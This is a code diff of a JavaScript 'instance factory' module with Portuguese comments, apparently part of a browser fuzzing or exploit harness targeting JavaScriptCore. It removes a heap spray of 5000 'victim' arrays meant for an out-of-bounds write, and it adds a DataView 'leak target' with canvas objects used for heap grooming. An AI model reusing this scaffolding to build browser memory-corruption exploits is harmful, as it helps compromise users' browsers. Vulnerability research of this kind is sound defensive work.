@@ -1,26 +1,11 @@
-
 /**
- * M√ìDULO 1: INSTANCE FACTORY (OOB WRITE EDITION)
- * Foco: Criar "V√≠timas" adjacentes ao DataView na Gigacage.
+ * M”DULO 1: INSTANCE FACTORY (MINIMIZADO)
+ * Foco exclusivo: InteraÁ„o entre Pixel Buffers (Canvas) e DataView.
  */
 
 export const Factory = {
     buildTargets: function() {
         const instances = [];
-
-        // =========================================================
-        // O EX√âRCITO DE V√çTIMAS
-        // Arrays de 64 bits inicializados com um valor falso.
-        // Se o OOB Write funcionar, um deles ser√° corrompido!
-        // =========================================================
-        window.victims = []; 
-        
-        for (let i = 0; i < 5000; i++) {
-            let ab = new ArrayBuffer(256); // Mesmo size-class do alvo
-            let view = new BigUint64Array(ab);
-            view.fill(0xAAAAAAAAAAAAAAAAn); // Valor "Seguro"
-            window.victims.push(view);
-        }
 
         const safeBuild = (category, name, builderFunc) => {
             try {
@@ -29,8 +14,24 @@ export const Factory = {
             } catch(e) {}
         };
 
-        // O nosso Atacante (DataView)
-        safeBuild("JSC", "DataView", () => new DataView(new ArrayBuffer(256)));
+        // ==========================================
+        // ALVOS ISOLADOS PARA O TESTE
+        // ==========================================
+        
+        // 1. O Alvo do Vazamento
+        safeBuild("JSC", "DataView", () => new DataView(new ArrayBuffer(64)));
+        
+        // 2. Os Criadores de "Buracos" (Heap Grooming acidental do Fuzzer)
+        safeBuild("DOM", "HTMLCanvas", () => document.createElement('canvas'));
+        safeBuild("DOM", "Canvas2DContext", () => document.createElement('canvas').getContext('2d', { willReadFrequently: true }));
+
+        // Tudo abaixo est· desativado para limpar o ruÌdo!
+        /*
+        safeBuild("JSC", "Uint8Array", () => new Uint8Array(256));
+        safeBuild("ECMA", "Map", () => new Map());
+        safeBuild("IPC", "MessageChannel", () => new MessageChannel());
+        safeBuild("MEDIA", "AudioContext", () => new window.AudioContext());
+        */
 
         return instances;
     }
